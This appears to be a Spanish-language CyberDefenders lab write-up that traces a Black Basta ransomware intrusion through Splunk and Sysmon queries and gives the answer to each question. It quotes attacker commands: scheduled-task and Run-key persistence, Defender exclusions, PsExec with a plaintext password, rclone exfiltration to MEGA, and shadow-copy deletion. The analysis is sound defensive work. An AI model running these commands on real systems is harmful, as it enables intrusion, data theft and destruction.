# Black Basta Lab

**Plataforma:** CyberDefenders

**Categoría:** Incident Response / Threat Hunting

**Dificultad:** Medium

**Fecha:** 2026-04-18

---

# Executive Summary

En este laboratorio se investigó un incidente de ransomware Black Basta contra la empresa OrionTech. Un empleado del área financiera descargó un archivo ZIP malicioso desde un correo que simulaba provenir de un proveedor legítimo. El archivo contenía un documento Excel con macros (`.xlsm`) que inició una cadena de compromiso completa.

El análisis de telemetría Sysmon en Splunk permitió reconstruir el kill chain completo: desde la descarga inicial del ZIP desde `54.93.105.22`, la ejecución del macro que spawneó PowerShell para dropear un VBScript y registrar una DLL maliciosa (`WindowsUpdaterFX.dll`) mediante `regsvr32.exe`, hasta el establecimiento de persistencia dual (Scheduled Task + Registry Run Key), evasión de Windows Defender, beacon C2 (`Pancake.jpg.exe`), reconocimiento de red con NetScan, y movimiento lateral con PsExec hacia el Domain Controller `DC01`.

En DC01, el atacante exfiltró datos sensibles del directorio `C:\clients` comprimiéndolos en `data.zip` y subiéndolos a MEGA cloud storage mediante `rclone`. Finalmente, desplegó el ransomware `6as98v.exe` que eliminó shadow copies, forzó Safe Mode y encriptó archivos con la extensión `.basta`.

El ataque abarcó un período de aproximadamente 1 hora y 44 minutos (15:08 — 16:52 UTC) comprometiendo dos sistemas: la workstation `ws1` (usuario `knixon`) y el Domain Controller `DC01` (usuario `swhite`).

---

# Analysis

## Q1 — What was the full URL used to download the malicious ZIP file?

El evento Sysmon Event ID 15 (FileCreateStreamHash) registra el Alternate Data Stream `:Zone.Identifier` que Windows escribe cuando un archivo se descarga desde internet. El campo `Contents` contiene el `ZoneId=3` (origen: internet) y el `HostUrl` de donde provino el archivo.

**Query:**
```
index=* file_name=*.zip* EventID=15
| table _time, Contents
```

<img width="1201" height="510" alt="image" src="https://github.com/user-attachments/assets/4ce56768-d294-47be-9b57-a333c92d5918" />


ZoneId=3 confirma descarga desde internet. El campo HostUrl contiene la URL exacta de origen.

**Respuesta:** `http://54.93.105.22/Financial%20Records.zip`

---

## Q2 — What is the SHA256 hash of the malicious Excel file?

Combinamos dos filtros clave en EID 15: `Image=*EXCEL.exe` (el stream fue creado en contexto de Excel) y `file_name=*.xlsm` (extensión que indica Excel con macros habilitadas). EID 15 incluye el campo SHA256 del archivo al momento de creación del ADS.

**Query:**
```
index=* Image=*EXCEL.exe file_name=*.xlsm EventID=15
| table _time, SHA256
```

<img width="1176" height="465" alt="image" src="https://github.com/user-attachments/assets/8bbb269a-194d-4780-a391-c3d686f9f8c8" />

La extensión `.xlsm` es un indicador importante — a diferencia de `.xlsx`, los archivos `.xlsm` contienen macros VBA, lo que los convierte en un vector de entrega común.

**Respuesta:** `030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15`

---

## Q3 — What is the name of the file created after the Excel document was opened?

El macro de Excel se ejecutó bajo el usuario `knixon`. Los macros maliciosos típicamente invocan PowerShell para dropear el siguiente stage. Filtramos por EID 11 (File Create) con PowerShell como proceso responsable y el usuario comprometido.

**Query:**
```
index=* EventID=11 user=knixon Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
| table _time, Image, TargetFilename
| sort _time
```

<img width="1587" height="774" alt="image" src="https://github.com/user-attachments/assets/a9f42dd8-fd5f-4a7d-8855-a408c406b7db" />

El drop en `%TEMP%` es un indicador clásico — los atacantes usan esa carpeta porque los usuarios tienen permisos de escritura sin necesitar privilegios elevados. La extensión `.vbs` indica un segundo stage en VBScript.

**Respuesta:** `F6w1S48.vbs`

---

## Q4 — What is the full file path of the file created after the Excel document was opened?

Misma query de Q3. El path completo aparece en el campo `TargetFilename`.

**Query:**
```
index=* EventID=11 user=knixon Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
| table _time, Image, TargetFilename
| sort _time
```

**Respuesta:** `C:\Users\knixon\AppData\Local\Temp\F6w1S48.vbs`

---

## Q5 — What is the name of the DLL deployed during the early execution stage?

En los resultados de Q3 se observó actividad de `regsvr32.exe` creando archivos. `regsvr32.exe` es un binario legítimo de Windows cuya función es registrar y cargar DLLs — los atacantes lo abusan porque es un proceso firmado y confiable que permite cargar DLLs maliciosas evadiendo controles (MITRE T1218.010 - Regsvr32). Buscamos EID 7 (Image Load) para ver qué DLL cargó regsvr32.

**Query:**
```
index=* EventID=7 user=knixon ImageLoaded="*.dll" Image="C:\\Windows\\System32\\regsvr32.exe"
| table _time, Image, ImageLoaded
| sort _time
```

<img width="1451" height="492" alt="image" src="https://github.com/user-attachments/assets/7794a667-428b-43a9-aaf5-1d943a93a272" />

El nombre `WindowsUpdaterFX.dll` imita software legítimo de Windows — táctica común para pasar desapercibido (T1036 - Masquerading).

**Respuesta:** `WindowsUpdaterFX.dll`

---

## Q6 — What was the Process ID of the process that launched the malicious DLL?

Misma query de Q5, agregando el campo `ProcessId` para obtener el PID del proceso que cargó la DLL.

**Query:**
```
index=* EventID=7 user=knixon ImageLoaded="*.dll" Image="C:\\Windows\\System32\\regsvr32.exe"
| table _time, Image, ProcessId, ImageLoaded
| sort _time
```

<img width="1494" height="501" alt="image" src="https://github.com/user-attachments/assets/6c3ce2c8-cad4-4b2f-9d02-ac79dceba79d" />

Este PID (8592) corresponde al `regsvr32.exe` malicioso. Se utiliza como pivote para rastrear toda la actividad posterior.

**Respuesta:** `8592`

---

## Q7 — What was the name of the scheduled task created for persistence?

El EID 4698 (Scheduled Task Created) no estaba disponible en los logs, probablemente por configuración de auditoría limitada. Usando el contexto acumulado (PID 8592 = regsvr32 malicioso), buscamos procesos hijos via EID 1 y encontramos `schtasks.exe` con el CommandLine completo de creación de la tarea.

**Query:**
```
index=* EventID=1 Image="*schtasks.exe" user=knixon
| table _time, CommandLine, ParentImage, ParentProcessId
```

<img width="1714" height="626" alt="image" src="https://github.com/user-attachments/assets/8ea6766f-3a54-4233-bd6a-d57306ba820b" />

El CommandLine reveló:
```
schtasks /Create /RU "NT AUTHORITY\SYSTEM" /SC ONLOGON /TN "WiindowsUpdate" /TR "C:\Windows\System32\regsvr32.exe /s %%localappdata%%\Temp\WindowsUpdaterFX.dll"
```

**Respuesta:** `WiindowsUpdate`

---

## Q8 — What is the full registry key added for persistence?

EID 13 (RegistryEvent Value Set) no estaba disponible en los logs. Sin embargo, en los eventos EID 1 se identificaron múltiples ejecuciones de `cmd.exe` invocando PowerShell con el flag `-EncodedCommand` (Base64). Al decodificar el payload en CyberChef se reveló un script que escribe una clave de registro Run.

**Query:**
```
index=* EventID=1 ParentProcessId=8592
| table _time, Image, CommandLine, ParentImage
| sort _time
```

<img width="1546" height="756" alt="image" src="https://github.com/user-attachments/assets/a2f31a1e-ca56-48da-93bc-86b273625b0a" />

El payload decodificado:
```
$objShell = New-Object -ComObject WScript.Shell;
$objShell.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater", "wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs", "REG_SZ")
```

Esto establece un segundo mecanismo de persistencia (T1547.001 Registry Run Keys) que ejecuta el VBScript `F6w1S48.vbs` en cada logon del usuario.

**Respuesta:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater`

---

## Q9 — To evade detection, the attacker excluded 3 directories from Windows Defender. What are the full paths of the excluded directories?

Los otros 3 comandos con `-EncodedCommand` del mismo bloque de eventos (Q8) contenían exclusiones de Windows Defender. Al decodificar cada uno en CyberChef se revelaron llamadas a `Add-MpPreference -ExclusionPath`.

**Query:**
```
index=* EventID=1 ParentProcessId=8592 CommandLine="*EncodedCommand*"
| table _time, CommandLine
| sort _time
```

<img width="1886" height="695" alt="image" src="https://github.com/user-attachments/assets/06fceb6b-9052-4bf2-999a-f37aa6407aca" />

Las rutas excluidas corresponden a los directorios donde el atacante almacenó sus artefactos:
- `%LOCALAPPDATA%\Temp` → donde están F6w1S48.vbs, WindowsUpdaterFX.dll y Pancake.jpg.exe
- `%APPDATA%\Microsoft` → ruta de staging de payloads
- `C:\ProgramData\Microsoft\ssh` → preparación para lateral movement

**Respuesta:**
```
C:\ProgramData\Microsoft\ssh
%APPDATA%\Microsoft
%LOCALAPPDATA%\Temp
```

---

## Q10 — To establish communication with a remote server, a beacon file was dropped on the system. What was the name of the dropped beacon file?

Buscamos conexiones de red (EID 3) del usuario `knixon` para identificar procesos con patrón de beaconing. El proceso `Pancake.jpg.exe` generó 235 conexiones a `54.93.105.22:80` con intervalos regulares de ~60 segundos.

**Query:**
```
index=* EventCode=3 user=knixon
| stats count by process_name
```

<img width="1568" height="526" alt="image" src="https://github.com/user-attachments/assets/b5402987-1624-44c9-8dae-9491c5b15899" />

**Respuesta:** `Pancake.jpg.exe`

---

## Q11 — The beacon was used to communicate with the attacker’s Command and Control (C2) infrastructure. What was the IP address used for C2 communication?

Directo de los resultados de EID 3 — `Pancake.jpg.exe` conectando siempre al mismo destino. Es la misma IP de donde se descargó el ZIP inicial, confirmando infraestructura centralizada del atacante.

**Query:**
```
index=* EventCode=3 user=knixon process_name="Pancake.jpg.exe"
| table _time, process_name, DestinationPort, DestinationIp
| sort _time
```

<img width="1568" height="662" alt="image" src="https://github.com/user-attachments/assets/10024158-253a-4735-aeb3-18bd19268dc7" />

**Respuesta:** `54.93.105.22`

---

## Q12 — To move laterally across the network, the attacker deployed a remote execution tool. What tool was used by the attacker to run commands remotely on other systems in the network?

Buscamos procesos hijos spawneados por `Pancake.jpg.exe` (C2) via EID 1 para ver las acciones ejecutadas por el atacante. El CommandLine revela el uso de PsExec para ejecución remota en otros hosts.

**Query:**
```
index=* user=knixon ParentImage="C:\\Users\\knixon\\AppData\\Local\\Temp\\Pancake.jpg.exe" EventID=1
| table _time, Image, ParentImage, CommandLine
| sort _time
```

<img width="1862" height="621" alt="image" src="https://github.com/user-attachments/assets/b80513bb-ee01-415d-a349-d9cbf8c7ea9a" />

**Respuesta:** `PsExec`

---

## Q13 — A deprecated Windows command-line utility was used to download malicious files. What tool was used for this task?

En los resultados de Q12 se observan múltiples descargas ejecutadas via `bitsadmin /transfer`. BITSAdmin es una utilidad legacy de Windows (deprecada desde Windows 7/8) que los atacantes abusan para descargar archivos porque es un binario firmado por Microsoft (T1197 - BITS Jobs).

**Query:**
```
index=* user=knixon ParentImage="C:\\Users\\knixon\\AppData\\Local\\Temp\\Pancake.jpg.exe" EventID=1
| table _time, Image, ParentImage, CommandLine
| sort _time
```

<img width="1523" height="664" alt="image" src="https://github.com/user-attachments/assets/f9d012e1-7961-49da-bc4a-e37f269bbf0b" />

Archivos descargados via bitsadmin:
- `netscan_portable.zip` desde softperfect.com
- `PsExec64.exe` desde raw.githubusercontent.com

**Respuesta:** `bitsadmin`

---

## Q14 — To download files on the the attacker used a legitimate command-line tool. Which tool was used to download files into the machine? DC01

Filtramos EID 1 en el host DC01 para ver los procesos ejecutados post lateral movement. El CommandLine muestra que el atacante usó `curl` para descargar `rclone` desde internet.

**Query:**
```
index=* host=DC01 EventID=1
| table _time, Image, ParentImage, CommandLine
| sort _time
```

<img width="1885" height="580" alt="image" src="https://github.com/user-attachments/assets/c1d35fe9-9f13-4ea3-b2ef-54d34cb31190" />

```
curl -o "C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64.zip" https://downloads.rclone.org/v1.69.1/rclone-v1.69.1-windows-amd64.zip
```

**Respuesta:** `curl`

---

## Q15 — The attacker scanned the internal network to discover additional targets. What is the full command that was executed for network discovery?


El C2 (`Pancake.jpg.exe`) spawneó `cmd.exe` que ejecutó `netscan.exe` para descubrir hosts en la red interna.

**Query:**
```
index=* user=knixon EventID=1 Image="C:\\Windows\\System32\\cmd.exe"
| table _time, ParentImage, CommandLine
| sort _time
```

<img width="1568" height="604" alt="image" src="https://github.com/user-attachments/assets/2cf7f2c6-312e-4a0b-8bba-8ef42b114cad" />

Desglose del comando:
- `/hide` corre sin ventana visible (evasión)
- `/range:10.10.11.1-10.10.255.255` escanea toda la subred interna
- `/auto:results.xml` guarda resultados automáticamente para procesamiento posterior

**Respuesta:** `C:\Windows\system32\cmd.exe /C %%LOCALAPPDATA%%\Temp\64-bit\netscan.exe /hide /range:10.10.11.1-10.10.255.255 /auto:results.xml`

---

## Q16 — A privileged domain account was used to facilitate data exfiltration from the domain controller. Which user account was compromised on DC01?

Buscamos logons en DC01 a partir del momento del lateral movement (16:06), filtrando cuentas de máquina y enfocando en logon types relevantes (interactive, network, remote). El campo `process_name` confirmó `PSEXESVC.exe`, validando acceso via PsExec.

**Query:**
```
index=* host=DC01 EventCode=4624 Logon_Type IN (2,3,10) user!="*$" earliest="03/21/2025:16:06:00"
| table _time, user, process_name, Source_Network_Address, Logon_Type
| sort _time
```

<img width="1164" height="690" alt="image" src="https://github.com/user-attachments/assets/dc2dee9d-22ab-40a1-922b-f215a2ac2998" />

Las credenciales de `swhite` fueron visibles en claro en el CommandLine del lateral movement:
```
PsExec64.exe /accepteula \\10.10.11.170 -u financees.local\swhite -p "b&lt;ZITx4h1"
```

**Respuesta:** `swhite`

---

## Q17 — Toward the end of the attack, a ransomware payload was deployed to encrypt files across the system. What was the name of the file that launched the ransomware?

Buscamos procesos ejecutados en DC01 post lateral movement. El contexto previo a la ejecución del archivo revela el patrón clásico pre-ransomware: `bcdedit` para Safe Mode, `vssadmin` para borrar shadow copies, y descarga desde la IP del C2. Confirmamos con EID 11 que el archivo generó 218 archivos `readme.txt` (ransom notes) en todas las carpetas del sistema.

**Query (identificación):**
```
index=main EventCode=1 earliest="03/21/2025:16:06:00" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ParentImage="*cmd.exe"
| table _time, Image, CommandLine
| sort _time
```

<img width="1568" height="781" alt="image" src="https://github.com/user-attachments/assets/8f14654b-bfaf-4e20-bee2-a1ed3948bc84" />

**Query (confirmación — ransom notes):**
```spl
index=* EventCode=11 Image="*6as98v*"
| table _time, TargetFilename
| sort _time
```

<img width="1568" height="635" alt="image" src="https://github.com/user-attachments/assets/faf18544-f484-457a-aa7f-9384e27cb754" />

**Respuesta:** `6as98v.exe`

---

## Q18 — What was the Process ID  of the ransomware process?


Buscamos el evento EID 1 de `6as98v.exe` directamente. El XML del evento Sysmon contiene el campo `ProcessId`.

**Query:**
```
index=* host=DC01 EventCode=1 Image="*6as98v*"
| table _time, Image, ProcessId, CommandLine, ParentImage
```

<img width="1632" height="534" alt="image" src="https://github.com/user-attachments/assets/d3262c42-167a-41c1-8048-b0851248e09b" />

Datos del evento:
- **User:** NT AUTHORITY\SYSTEM máximos privilegios
- **ParentImage:** cmd.exe (PID 4752)
- **IntegrityLevel:** System

**Respuesta:** `5792`

---

## Q19 — The ransomware executed a command to remove shadow copies and prevent system recovery. Which user account executed this command?

Filtramos EID 1 buscando específicamente `vssadmin delete shadows` en DC01 post lateral movement.

**Query:**
```
index=main EventCode=1 earliest="03/21/2025:16:06:00" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ParentImage="*cmd.exe" CommandLine="C:\\Windows\\SysNative\\vssadmin.exe  delete shadows /all /quiet"
| table user, ParentUser
```

<img width="1259" height="319" alt="image" src="https://github.com/user-attachments/assets/211e0e21-ce7a-483c-a060-9e17560f775e" />


**Respuesta:** `NT AUTHORITY\SYSTEM`

---

## Q20 — To inhibit system recovery, the attacker issued a command to delete shadow copies. Which system utility was used to carry out this action?

El CommandLine de Q19 muestra directamente la utilidad usada. `vssadmin.exe` es una utilidad legítima de Windows para gestionar Volume Shadow Copies que los grupos de ransomware abusan para eliminar backups.

**Query:**
```
index=main EventCode=1 earliest="03/21/2025:16:06:00" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ParentImage="*cmd.exe" CommandLine="*delete shadows*"
| table _time, Image, CommandLine, User
```

**Respuesta:** `vssadmin`

---

## Q21 — After successful encryption, the ransomware altered the affected files. What file extension was appended to the encrypted files?

Buscamos todos los archivos en la carpeta `%TEMP%` del usuario `swhite` en DC01 post lateral movement, agrupados por nombre para identificar la extensión del ransomware. EID 23 (File Delete) y EID 29 (FileExecutableDetected) mostraron archivos con extensión `.basta`.

**Query:**
```
index=main earliest="03/21/2025:16:06:00" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "C:\\Users\\swhite\\AppData\\Local\\Temp\\*"
| stats count by file_name
```

<img width="796" height="560" alt="image" src="https://github.com/user-attachments/assets/e6abab83-7070-4345-9862-647332a2d04d" />

Los archivos `curl.exe.basta` y `rclone.exe.basta` confirman la extensión. El ransomware no discriminó y encriptó incluso las propias herramientas del atacante.

**Respuesta:** `.basta`

---

## Q22 — To prepare data for exfiltration, the attacker archived sensitive information into a compressed format. What was the name of the compressed file?

Buscamos EID 1 con `.zip` en DC01 post lateral movement. PowerShell usó `Compress-Archive` para comprimir el directorio `C:\clients` antes de exfiltrarlo.

**Query:**
```
index=main earliest="03/21/2025:16:06:00" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" *.zip EventID=1
| table _time, Image, CommandLine, ParentImage
```

<img width="1903" height="337" alt="image" src="https://github.com/user-attachments/assets/783e760c-c4e1-4200-bcd8-01ec329cd589" />

**Respuesta:** `data.zip`

---

## Q23 — To transmit the stolen data, the attacker utilized a third-party exfiltration tool. What tool was used to exfiltrate the compressed file?

En los eventos de Q22 se observa que después de comprimir los datos, el atacante usó `rclone` para copiar el archivo a MEGA. Rclone es una herramienta legítima de sincronización que los atacantes abusan para exfiltración.

**Query:**
```
index=main earliest="03/21/2025:16:06:00" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" *.zip EventID=1 Image="*rclone*"
| table _time, CommandLine
```

<img width="1386" height="322" alt="image" src="https://github.com/user-attachments/assets/0c0db3a0-66b1-4521-9d09-6b8097739a00" />

Cadena de exfiltración:
```
16:42:18 → rclone copy data.zip mega:data           ← primer intento
16:42:42 → rclone copy data.zip mega:data           ← reintento
16:43:29 → rclone copy data.zip mega:data --verbose ← reintento con verbose
```

**Respuesta:** `rclone`

---

## Q24 — The attacker uploaded the stolen data to a cloud-based service. What was the name of the cloud platform used for data exfiltration?

El CommandLine de rclone mostraba `mega:data` como destino. Para confirmar, buscamos EID 22 (DNS Query) de Sysmon que registra las consultas DNS realizadas por `rclone.exe`.

**Query (identificación):**
```
index=main earliest="03/21/2025:16:06:00" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" *.zip EventID=1 Image="*rclone*"
| table _time, CommandLine
```

**Query (confirmación DNS):**
```spl
index=* host=DC01 EventCode=22 Image="*rclone*"
| table _time, QueryName, QueryResults
| sort _time
```

<img width="1695" height="477" alt="image" src="https://github.com/user-attachments/assets/2e6c11e2-5309-48c8-bbb7-d3c37a93f8c6" />



Los dominios `userstorage.mega.co.nz` son los servidores donde se subieron los datos robados. MEGA es popular entre grupos de ransomware porque ofrece encriptación end-to-end y no requiere verificación estricta para crear cuentas.

**Respuesta:** `MEGA`

---

# Attack Timeline

| Tiempo (UTC) | Host | Evento | MITRE |
|---|---|---|---|
| 2025-03-21 15:08:41 | ws1 | ZIP descargado desde http://54.93.105.22/Financial%20Records.zip | T1566.001 |
| 2025-03-21 15:09:06 | ws1 | Excel .xlsm abierto por knixon, macro ejecutado | T1204.002 |
| 2025-03-21 15:15:28 | ws1 | PowerShell dropea F6w1S48.vbs en %TEMP% | T1059.001 |
| 2025-03-21 15:15:35 | ws1 | regsvr32.exe (PID 8592) carga WindowsUpdaterFX.dll | T1218.010 |
| 2025-03-21 15:15:35 | ws1 | Scheduled Task "WiindowsUpdate" creada como SYSTEM | T1053.005 |
| 2025-03-21 15:15:35 | ws1 | Registry Run Key "WindowsUpdater" creada (Base64 decoded) | T1547.001 |
| 2025-03-21 15:15:35 | ws1 | 3 exclusiones de Windows Defender configuradas | T1562.001 |
| 2025-03-21 15:15:35 | ws1 | Pancake.jpg.exe dropeado por regsvr32.exe | T1036 |
| 2025-03-21 15:17:43 | ws1 | Beacon C2 inicia → 54.93.105.22:80 (~60s interval) | T1071.001 |
| 2025-03-21 15:20:42 | ws1 | Reconocimiento: systeminfo, whoami, net group "domain admins" | T1087.002 |
| 2025-03-21 15:27:28 | ws1 | bitsadmin descarga netscan_portable.zip | T1197 |
| 2025-03-21 15:43:59 | ws1 | netscan escanea 10.10.11.1-10.10.255.255 | T1046 |
| 2025-03-21 15:59:09 | ws1 | bitsadmin descarga PsExec64.exe desde GitHub | T1197 |
| 2025-03-21 16:06:21 | ws1 → DC01 | PsExec lateral movement a \\10.10.11.170 (swhite) | T1569.002 |
| 2025-03-21 16:10:41 | ws1 → DC01 | PsExec copia Pancake.jpg.exe al DC | T1570 |
| 2025-03-21 16:35:06 | DC01 | curl descarga rclone v1.69.1 | T1105 |
| 2025-03-21 16:38:15 | DC01 | rclone config configurado | T1567.002 |
| 2025-03-21 16:41:15 | DC01 | Compress-Archive "C:\clients" → data.zip | T1560.001 |
| 2025-03-21 16:42:18 | DC01 | rclone copy data.zip mega:data (exfiltración) | T1567.002 |
| 2025-03-21 16:45:19 | DC01 | bcdedit /set safeboot network | T1562.009 |
| 2025-03-21 16:47:19 | DC01 | curl descarga 6as98v.exe desde 54.93.105.22 | T1105 |
| 2025-03-21 16:49:19 | DC01 | vssadmin delete shadows /all /quiet | T1490 |
| 2025-03-21 16:49:19 | DC01 | 6as98v.exe ejecutado (PID 5792) como SYSTEM | T1486 |
| 2025-03-21 16:49:24 | DC01 | 218x readme.txt (ransom notes) dropeados | T1486 |
| 2025-03-21 16:52:52 | ws1 | PowerShell Remove-Item limpia %TEMP% | T1070.004 |

---

# MITRE ATT&CK Mapping

| ID | Técnica | Detalle |
|---|---|---|
| T1566.001 | Phishing: Spearphishing Attachment | ZIP malicioso descargado desde email de proveedor falso |
| T1204.002 | User Execution: Malicious File | knixon abrió Financial Records.xlsm y habilitó macros |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Macro ejecutó PowerShell con -EncodedCommand para dropear VBS y configurar persistencia |
| T1218.010 | System Binary Proxy Execution: Regsvr32 | regsvr32.exe cargó WindowsUpdaterFX.dll para evadir controles |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Tarea "WiindowsUpdate" creada para ejecutar DLL en cada logon como SYSTEM |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Clave Run "WindowsUpdater" para ejecutar F6w1S48.vbs en logon |
| T1562.001 | Impair Defenses: Disable or Modify Tools | 3 exclusiones de Windows Defender en directorios del atacante |
| T1036 | Masquerading | Pancake.jpg.exe (doble extensión), WiindowsUpdate (typo), WindowsUpdaterFX.dll (nombre legítimo) |
| T1071.001 | Application Layer Protocol: Web Protocols | Beacon C2 sobre HTTP puerto 80 |
| T1087.002 | Account Discovery: Domain Account | net group "domain admins" /domain |
| T1046 | Network Service Discovery | netscan.exe escaneó 10.10.11.1-10.10.255.255 |
| T1197 | BITS Jobs | bitsadmin descargó netscan y PsExec |
| T1569.002 | System Services: Service Execution | PsExec para ejecución remota en DC01 |
| T1570 | Lateral Tool Transfer | PsExec copió Pancake.jpg.exe al DC |
| T1105 | Ingress Tool Transfer | curl descargó rclone y ransomware en DC01 |
| T1560.001 | Archive Collected Data: Archive via Utility | Compress-Archive comprimió C:\clients en data.zip |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | rclone exfiltró data.zip a MEGA |
| T1562.009 | Impair Defenses: Safe Mode Boot | bcdedit /set safeboot network para evadir EDR/AV |
| T1490 | Inhibit System Recovery | vssadmin delete shadows /all /quiet |
| T1486 | Data Encrypted for Impact | 6as98v.exe encriptó archivos con extensión .basta |
| T1070.004 | Indicator Removal: File Deletion | PowerShell Remove-Item limpió %TEMP% |

---

# Conclusion

El análisis confirmó un ataque de ransomware Black Basta completo contra OrionTech. El vector de entrada fue un email de phishing con un ZIP conteniendo un Excel con macros maliciosas, descargado por el usuario `knixon` desde `54.93.105.22`.

El atacante estableció persistencia dual (Scheduled Task + Registry Run Key), deshabilitó Windows Defender en los directorios de staging, y desplegó un beacon C2 (`Pancake.jpg.exe`) que mantuvo comunicación constante con el servidor de comando y control sobre HTTP.

Tras reconocimiento de red con NetScan y enumeración de cuentas de dominio, el atacante se movió lateralmente al Domain Controller `DC01` usando PsExec con credenciales del usuario `swhite`. En el DC, descargó `rclone` para exfiltrar datos sensibles de `C:\clients` a MEGA cloud storage (double extortion), y posteriormente desplegó el ransomware `6as98v.exe` que eliminó shadow copies, forzó Safe Mode boot, y encriptó archivos con la extensión `.basta`.

La raíz del problema fue la falta de controles contra phishing (el usuario pudo descargar y ejecutar un archivo con macros desde una fuente externa), combinada con la ausencia de segmentación de red efectiva que permitió movimiento lateral desde una workstation hasta el Domain Controller. Las mitigaciones principales incluyen implementar políticas de macros restrictivas (bloquear macros de internet), segmentación de red, monitoreo de LOLBINs como regsvr32 y bitsadmin, y políticas de contraseñas robustas para cuentas de servicio.

